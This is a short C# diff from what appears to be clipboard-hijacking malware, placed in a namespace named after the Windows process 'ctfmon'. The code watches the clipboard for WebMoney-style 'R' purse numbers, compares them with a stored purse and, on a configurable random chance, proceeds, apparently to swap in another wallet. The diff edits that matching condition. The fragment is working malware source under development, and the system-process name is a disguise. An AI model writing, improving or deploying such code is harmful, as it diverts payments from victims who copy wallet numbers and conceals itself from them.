@@ -150,7 +150,7 @@ namespace ctfmon
                 string data = Clipboard.GetText();
                 if (Regex.IsMatch(data, "R[0-9]+", RegexOptions.IgnoreCase) && data != RPurse && Regex.Match(data, "R[0-9]+", RegexOptions.IgnoreCase).Value.Length == 13)
                 {
-                    if (data == RPurse)
+                    if (Regex.IsMatch(data,"R"+RPurse,RegexOptions.IgnoreCase))
                     {
                         if (rand.Next(0, 100) < configChance)
                         {
